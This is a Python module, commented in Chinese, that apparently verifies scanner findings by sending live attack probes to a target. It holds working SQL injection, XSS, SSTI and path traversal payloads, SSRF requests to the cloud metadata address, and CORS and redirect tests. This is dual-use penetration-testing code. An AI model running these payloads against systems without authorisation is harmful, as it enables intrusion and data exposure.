#!/usr/bin/env python3
"""
Real Validator — 真正的漏洞验证模块
不是问 LLM "你觉得这是不是真洞"，而是实际发请求验证

验证方法：
1. SQLi: 布尔差异法 + 时间延迟法
2. XSS: 检查 payload 是否未编码反射
3. SSTI: 检查数学运算是否被执行
4. SSRF: 检查 DNS/HTTP 回调
5. IDOR: 多账号交叉验证 + 数据对比
6. Race: 状态前后对比
7. 通用: 重放攻击确认可复现
"""

import asyncio
import json
import re
import time
from dataclasses import dataclass, field
from typing import Optional, Any

from http_engine import HttpEngine, HttpResponse


# ═══════════════════════════════════════════════════════════════
# 数据结构
# ═══════════════════════════════════════════════════════════════

@dataclass
class ValidationResult:
    """验证结果"""
    finding_id: str = ""
    vuln_type: str = ""
    url: str = ""
    # 验证状态
    is_valid: bool = False
    confidence: float = 0.0
    method: str = ""  # 使用的验证方法
    # 证据
    evidence: str = ""
    request_sent: str = ""
    response_received: str = ""
    # 可复现性
    reproducible: bool = False
    reproduction_count: int = 0


# ═══════════════════════════════════════════════════════════════
# Real Validator
# ═══════════════════════════════════════════════════════════════

class RealValidator:
    """
    真正的漏洞验证器 — 发请求验证，不问 AI
    
    用法:
        validator = RealValidator(http_engine, config)
        result = await validator.validate(finding)
        results = await validator.validate_batch(findings)
    """

    def __init__(self, http_engine: HttpEngine, config: dict = None):
        self.http = http_engine
        self.config = config or {}
        self.cookies = self.config.get("cookies", {})
        self.headers = self.config.get("headers", {})
        self.reproduction_attempts = self.config.get("reproduction_attempts", 3)

    # ─── 主入口 ────────────────────────────────────────────────

    async def validate(self, finding: dict) -> ValidationResult:
        """
        验证单个发现
        
        finding: {
            "type": "sqli/xss/ssti/ssrf/idor/race/cors/...",
            "url": "https://...",
            "param": "q",
            "payload": "' OR '1'='1",
            "method": "GET",
            "cookies": {},  # 可选
            "body": {},  # 可选
            ...
        }
        """
        vuln_type = finding.get("type", "").lower()
        
        validators = {
            "sqli": self._validate_sqli,
            "sql injection": self._validate_sqli,
            "xss": self._validate_xss,
            "cross-site scripting": self._validate_xss,
            "ssti": self._validate_ssti,
            "ssrf": self._validate_ssrf,
            "idor": self._validate_idor,
            "horizontal_idor": self._validate_idor,
            "race_condition": self._validate_race,
            "race condition": self._validate_race,
            "cors": self._validate_cors,
            "cors misconfiguration": self._validate_cors,
            "open_redirect": self._validate_redirect,
            "open redirect": self._validate_redirect,
            "path_traversal": self._validate_path_traversal,
            "lfi": self._validate_path_traversal,
        }

        validator_func = validators.get(vuln_type, self._validate_generic)
        result = await validator_func(finding)

        # 可复现性检查
        if result.is_valid:
            result.reproducible = await self._check_reproducibility(finding)
            result.reproduction_count = self.reproduction_attempts if result.reproducible else 0

        return result

    async def validate_batch(self, findings: list[dict]) -> list[ValidationResult]:
        """批量验证"""
        results = []
        for finding in findings:
            result = await self.validate(finding)
            results.append(result)
        return results

    # ─── SQL Injection 验证 ─────────────────────────────────────

    async def _validate_sqli(self, finding: dict) -> ValidationResult:
        """
        SQLi 验证：布尔差异法 + 时间延迟法
        
        方法 1: 发送 TRUE 和 FALSE 条件，如果响应不同 → 确认
        方法 2: 发送 SLEEP payload，如果延迟增加 → 确认
        """
        result = ValidationResult(
            vuln_type="sqli",
            url=finding.get("url", ""),
            method="boolean_diff + time_delay",
        )

        url = finding.get("url", "")
        param = finding.get("param", "")
        cookies = finding.get("cookies", self.cookies)

        if not url or not param:
            result.evidence = "缺少 url 或 param"
            return result

        # 方法 1: 布尔差异
        true_payloads = ["' AND '1'='1'-- -", "1 AND 1=1", "' OR '1'='1"]
        false_payloads = ["' AND '1'='2'-- -", "1 AND 1=2", "' OR '1'='2"]

        for true_p, false_p in zip(true_payloads, false_payloads):
            true_diffs = await self.http.diff_responses(
                url=url, param=param, payloads=[true_p], cookies=cookies
            )
            false_diffs = await self.http.diff_responses(
                url=url, param=param, payloads=[false_p], cookies=cookies
            )

            if true_diffs and false_diffs:
                true_resp = true_diffs[0].response
                false_resp = false_diffs[0].response
                
                if true_resp and false_resp:
                    # 状态码不同
                    if true_resp.status_code != false_resp.status_code:
                        result.is_valid = True
                        result.confidence = 0.9
                        result.evidence = (
                            f"布尔盲注: TRUE({true_p})→{true_resp.status_code}, "
                            f"FALSE({false_p})→{false_resp.status_code}"
                        )
                        return result

                    # 响应长度差异
                    len_diff = abs(true_resp.content_length - false_resp.content_length)
                    if len_diff > 20:
                        result.is_valid = True
                        result.confidence = 0.85
                        result.evidence = (
                            f"布尔盲注: TRUE 长度={true_resp.content_length}, "
                            f"FALSE 长度={false_resp.content_length} (差={len_diff})"
                        )
                        return result

        # 方法 2: 时间延迟
        time_payloads = [
            ("' AND SLEEP(3)-- -", 3),
            ("'; WAITFOR DELAY '0:0:3'-- -", 3),
            ("' AND pg_sleep(3)-- -", 3),
        ]

        for payload, expected_delay in time_payloads:
            diffs = await self.http.diff_responses(
                url=url, param=param, payloads=[payload], cookies=cookies
            )
            
            if diffs and diffs[0].time_diff >= expected_delay - 0.5:
                result.is_valid = True
                result.confidence = 0.9
                result.evidence = (
                    f"时间盲注: payload='{payload}', "
                    f"延迟={diffs[0].time_diff:.2f}s (预期≥{expected_delay}s)"
                )
                return result

        result.evidence = "布尔差异和时间延迟都未确认"
        return result

    # ─── XSS 验证 ─────────────────────────────────────────────

    async def _validate_xss(self, finding: dict) -> ValidationResult:
        """
        XSS 验证：检查 payload 是否在响应中未编码反射
        """
        result = ValidationResult(
            vuln_type="xss",
            url=finding.get("url", ""),
            method="reflection_check",
        )

        url = finding.get("url", "")
        param = finding.get("param", "")
        payload = finding.get("payload", "")
        cookies = finding.get("cookies", self.cookies)

        if not url or not param:
            result.evidence = "缺少 url 或 param"
            return result

        # 使用唯一标记避免误判
        canary = f"baiXSS{int(time.time())}"
        test_payloads = [
            f"<img src=x onerror=alert('{canary}')>",
            f"\"><img src=x onerror=alert('{canary}')>",
            f"<svg onload=alert('{canary}')>",
            f"<script>alert('{canary}')</script>",
        ]

        if payload:
            test_payloads.insert(0, payload)

        for test_payload in test_payloads:
            diffs = await self.http.diff_responses(
                url=url, param=param, payloads=[test_payload], cookies=cookies
            )

            if diffs and diffs[0].response:
                body = diffs[0].response.body
                
                # 检查原始 payload 是否在响应中（未编码）
                if test_payload in body:
                    # 确认没被 HTML 编码
                    encoded_version = (test_payload
                        .replace("<", "&lt;")
                        .replace(">", "&gt;")
                        .replace("\"", "&quot;"))
                    
                    if encoded_version not in body or test_payload in body:
                        result.is_valid = True
                        result.confidence = 0.9
                        result.evidence = (
                            f"XSS确认: payload '{test_payload[:60]}' "
                            f"在响应中未编码反射"
                        )
                        result.request_sent = f"GET {url}?{param}={test_payload[:50]}"
                        result.response_received = body[body.find(test_payload)-50:body.find(test_payload)+len(test_payload)+50][:200]
                        return result

                # 部分反射检查
                if canary in body:
                    result.is_valid = True
                    result.confidence = 0.7
                    result.evidence = (
                        f"XSS部分确认: canary '{canary}' 在响应中反射，"
                        f"上下文: {diffs[0].reflection_context}"
                    )
                    return result

        result.evidence = "payload 在响应中未反射或被编码"
        return result

    # ─── SSTI 验证 ─────────────────────────────────────────────

    async def _validate_ssti(self, finding: dict) -> ValidationResult:
        """
        SSTI 验证：数学运算 + 框架特征识别
        """
        result = ValidationResult(
            vuln_type="ssti",
            url=finding.get("url", ""),
            method="math_execution",
        )

        url = finding.get("url", "")
        param = finding.get("param", "")
        cookies = finding.get("cookies", self.cookies)

        if not url or not param:
            result.evidence = "缺少 url 或 param"
            return result

        # 用随机数避免误判
        import random
        a, b = random.randint(10, 99), random.randint(10, 99)
        expected = str(a * b)

        math_tests = [
            (f"{{{{{a}*{b}}}}}", expected),  # Jinja2/Twig: {{a*b}}
            (f"${{{a}*{b}}}", expected),  # Freemarker/EL: ${a*b}
            (f"<%= {a}*{b} %>", expected),  # ERB
            (f"#{{{a}*{b}}}", expected),  # Ruby
        ]

        for payload, expected_result in math_tests:
            diffs = await self.http.diff_responses(
                url=url, param=param, payloads=[payload], cookies=cookies
            )

            if diffs and diffs[0].response:
                body = diffs[0].response.body
                
                # 结果出现且原始模板语法不在
                if expected_result in body and payload not in body:
                    result.is_valid = True
                    result.confidence = 0.95
                    result.evidence = (
                        f"SSTI确认: {payload} → 响应包含 {expected_result}"
                    )
                    return result

        result.evidence = "数学运算未被执行"
        return result

    # ─── SSRF 验证 ─────────────────────────────────────────────

    async def _validate_ssrf(self, finding: dict) -> ValidationResult:
        """
        SSRF 验证：检查内网/元数据响应
        """
        result = ValidationResult(
            vuln_type="ssrf",
            url=finding.get("url", ""),
            method="internal_access_check",
        )

        url = finding.get("url", "")
        param = finding.get("param", "")
        cookies = finding.get("cookies", self.cookies)

        if not url or not param:
            result.evidence = "缺少 url 或 param"
            return result

        ssrf_targets = [
            ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "iam"]),
            ("http://127.0.0.1:80/", ["html", "body", "server"]),
            ("http://[::1]/", ["html", "body"]),
        ]

        for ssrf_url, indicators in ssrf_targets:
            diffs = await self.http.diff_responses(
                url=url, param=param, payloads=[ssrf_url], cookies=cookies
            )

            if diffs and diffs[0].response:
                body = diffs[0].response.body.lower()
                
                for indicator in indicators:
                    if indicator.lower() in body:
                        result.is_valid = True
                        result.confidence = 0.9
                        result.evidence = (
                            f"SSRF确认: 请求 {ssrf_url} 后"
                            f"响应包含 '{indicator}'"
                        )
                        return result

        result.evidence = "未能访问内网资源"
        return result

    # ─── IDOR 验证 ─────────────────────────────────────────────

    async def _validate_idor(self, finding: dict) -> ValidationResult:
        """
        IDOR 验证：重放 + 数据内容检查
        """
        result = ValidationResult(
            vuln_type="idor",
            url=finding.get("url", ""),
            method="cross_account_replay",
        )

        url = finding.get("url", "")
        attacker_cookies = finding.get("attacker_cookies", self.cookies)

        if not url:
            result.evidence = "缺少 url"
            return result

        # 重放攻击者的请求
        resp = await self.http.request("GET", url, cookies=attacker_cookies)

        if resp.status_code == 200:
            # 检查是否包含敏感数据
            private_patterns = [
                r'"email"\s*:\s*"[^"]+@[^"]+"',
                r'"phone"\s*:\s*"[\d\-\+]+"',
                r'"address"\s*:',
                r'"real_name"\s*:',
                r'"id_card"\s*:',
            ]

            found_private = []
            for pattern in private_patterns:
                if re.search(pattern, resp.body, re.I):
                    found_private.append(pattern.split('"')[1])

            if found_private:
                result.is_valid = True
                result.confidence = 0.85
                result.evidence = (
                    f"IDOR确认: 攻击者可访问此资源，"
                    f"响应包含敏感字段: {', '.join(found_private)}"
                )
            else:
                result.confidence = 0.5
                result.evidence = "可访问但未检测到明确的敏感数据"
        else:
            result.evidence = f"重放请求返回 {resp.status_code}"

        return result

    # ─── Race Condition 验证 ───────────────────────────────────

    async def _validate_race(self, finding: dict) -> ValidationResult:
        """
        竞态条件验证：重新并发测试 + 状态检查
        """
        result = ValidationResult(
            vuln_type="race_condition",
            url=finding.get("url", ""),
            method="concurrent_replay",
        )

        url = finding.get("url", "")
        body = finding.get("body") or finding.get("payload")
        cookies = finding.get("cookies", self.cookies)

        if not url:
            result.evidence = "缺少 url"
            return result

        # 并发重放
        race_result = await self.http.race_test(
            method="POST",
            url=url,
            count=10,
            cookies=cookies,
            json_data=body if isinstance(body, dict) else None,
        )

        if race_result["likely_vulnerable"]:
            result.is_valid = True
            result.confidence = 0.8
            result.evidence = race_result["evidence"]
        else:
            result.evidence = f"并发测试: {race_result['success_count']}/{race_result['total']} 成功"

        return result

    # ─── CORS 验证 ─────────────────────────────────────────────

    async def _validate_cors(self, finding: dict) -> ValidationResult:
        """
        CORS 验证：测试凭证模式下的跨域访问
        """
        result = ValidationResult(
            vuln_type="cors",
            url=finding.get("url", ""),
            method="origin_reflection_check",
        )

        url = finding.get("url", "")
        cookies = finding.get("cookies", self.cookies)

        if not url:
            result.evidence = "缺少 url"
            return result

        # 测试不同 Origin
        test_origins = [
            "https://evil.com",
            "https://target.com.evil.com",
            "null",
        ]

        for origin in test_origins:
            resp = await self.http.request(
                "GET", url,
                headers={"Origin": origin},
                cookies=cookies,
            )

            acao = resp.headers.get("access-control-allow-origin", "")
            acac = resp.headers.get("access-control-allow-credentials", "")

            if origin in acao and acac.lower() == "true":
                result.is_valid = True
                result.confidence = 0.9
                result.evidence = (
                    f"CORS确认: Origin={origin} 被反射, "
                    f"Allow-Credentials=true (可窃取认证数据)"
                )
                return result
            elif acao == "*" and acac.lower() == "true":
                result.is_valid = True
                result.confidence = 0.85
                result.evidence = "CORS: Allow-Origin=* 且 Allow-Credentials=true"
                return result

        result.evidence = "CORS 配置正确或不反射任意 Origin"
        return result

    # ─── Open Redirect 验证 ────────────────────────────────────

    async def _validate_redirect(self, finding: dict) -> ValidationResult:
        """Open Redirect 验证"""
        result = ValidationResult(
            vuln_type="open_redirect",
            url=finding.get("url", ""),
            method="redirect_follow",
        )

        url = finding.get("url", "")
        param = finding.get("param", "")

        if not url or not param:
            result.evidence = "缺少 url 或 param"
            return result

        evil_domain = "https://evil.example.com"
        
        # 不跟随重定向，检查 Location header
        resp = await self.http.request(
            "GET", url,
            params={param: evil_domain},
            allow_redirects=False,
        )

        if resp.status_code in (301, 302, 303, 307, 308):
            location = resp.headers.get("location", "")
            if "evil.example.com" in location:
                result.is_valid = True
                result.confidence = 0.9
                result.evidence = f"Open Redirect: Location={location}"
                return result

        result.evidence = "未发生重定向到外部域"
        return result

    # ─── Path Traversal 验证 ───────────────────────────────────

    async def _validate_path_traversal(self, finding: dict) -> ValidationResult:
        """Path Traversal / LFI 验证"""
        result = ValidationResult(
            vuln_type="path_traversal",
            url=finding.get("url", ""),
            method="known_file_check",
        )

        url = finding.get("url", "")
        param = finding.get("param", "")
        cookies = finding.get("cookies", self.cookies)

        if not url or not param:
            result.evidence = "缺少 url 或 param"
            return result

        # 尝试读取已知文件
        lfi_tests = [
            ("../../../etc/passwd", "root:"),
            ("....//....//....//etc/passwd", "root:"),
            ("/etc/passwd", "root:"),
            ("../../../etc/hostname", ""),  # 任何内容都说明成功
        ]

        for payload, indicator in lfi_tests:
            diffs = await self.http.diff_responses(
                url=url, param=param, payloads=[payload], cookies=cookies
            )

            if diffs and diffs[0].response:
                body = diffs[0].response.body
                
                if indicator and indicator in body:
                    result.is_valid = True
                    result.confidence = 0.95
                    result.evidence = (
                        f"LFI确认: payload='{payload}', "
                        f"响应包含 '{indicator}'"
                    )
                    return result
                elif not indicator and diffs[0].anomaly_score > 50:
                    result.is_valid = True
                    result.confidence = 0.7
                    result.evidence = (
                        f"LFI可能: payload='{payload}', "
                        f"响应异常 (score={diffs[0].anomaly_score})"
                    )
                    return result

        result.evidence = "未能读取服务器文件"
        return result

    # ─── 通用验证 ─────────────────────────────────────────────

    async def _validate_generic(self, finding: dict) -> ValidationResult:
        """通用验证：重放原始请求"""
        result = ValidationResult(
            vuln_type=finding.get("type", "unknown"),
            url=finding.get("url", ""),
            method="replay",
        )

        url = finding.get("url", "")
        payload = finding.get("payload", "")
        param = finding.get("param", "")
        method = finding.get("method", "GET")
        cookies = finding.get("cookies", self.cookies)

        if not url:
            result.evidence = "缺少 url"
            return result

        if param and payload:
            diffs = await self.http.diff_responses(
                url=url, param=param, payloads=[payload],
                method=method, cookies=cookies
            )
            if diffs and diffs[0].anomaly_score >= 40:
                result.is_valid = True
                result.confidence = diffs[0].anomaly_score / 100.0
                result.evidence = f"重放验证: anomaly_score={diffs[0].anomaly_score}"
        else:
            resp = await self.http.request(method, url, cookies=cookies)
            if resp.status_code == 200:
                result.confidence = 0.5
                result.evidence = f"重放返回 {resp.status_code}"

        return result

    # ─── 可复现性检查 ──────────────────────────────────────────

    async def _check_reproducibility(self, finding: dict) -> bool:
        """检查漏洞是否可稳定复现"""
        url = finding.get("url", "")
        param = finding.get("param", "")
        payload = finding.get("payload", "")
        cookies = finding.get("cookies", self.cookies)

        if not url or not param or not payload:
            return False

        success_count = 0
        for _ in range(self.reproduction_attempts):
            diffs = await self.http.diff_responses(
                url=url, param=param, payloads=[payload], cookies=cookies
            )
            if diffs and diffs[0].anomaly_score >= 30:
                success_count += 1
            await asyncio.sleep(0.5)

        return success_count >= (self.reproduction_attempts * 0.6)
